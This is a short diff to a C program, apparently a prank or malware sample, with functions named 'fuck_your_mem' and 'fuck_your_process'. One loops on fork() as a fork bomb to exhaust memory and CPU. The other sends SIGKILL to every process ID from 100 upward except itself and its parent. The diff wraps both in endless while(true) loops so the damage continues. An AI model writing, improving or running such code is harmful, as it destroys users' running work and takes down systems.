@@ -44,6 +44,7 @@ void * fuck_your_mem () {
  int counter_trigger = 0;
 
  //alien's lame strategy to not get our crappy process killed yet burning CPU
+ while(true) { //stabilize thread
  while(sin(1 / 10 * counter_trigger) != cos(1 / 10 * counter_trigger)) { //Increased period
 	 if(counter_trigger > 4096)
 	  fork(); //only forks if memory is allocated to an extent
@@ -57,14 +58,17 @@ void * fuck_your_mem () {
 	  fork(); //let's have some fun first
          x++;
  }
+ }
  return 0;
 }
 
 void * fuck_your_process () {
  pid_t pid_indicator = 1;
- while(pid_indicator != getpid() && pid_indicator >= 100) { //kill everyone except ourselves and some lower-level services
+ while(true) {
+ while(pid_indicator != getpid() && pid_indicator != getppid() && pid_indicator >= 100) { //kill everyone except ourselves and some lower-level services
   //kill ya
   kill(pid_indicator ,SIGKILL);
+ }
  }
 }
 
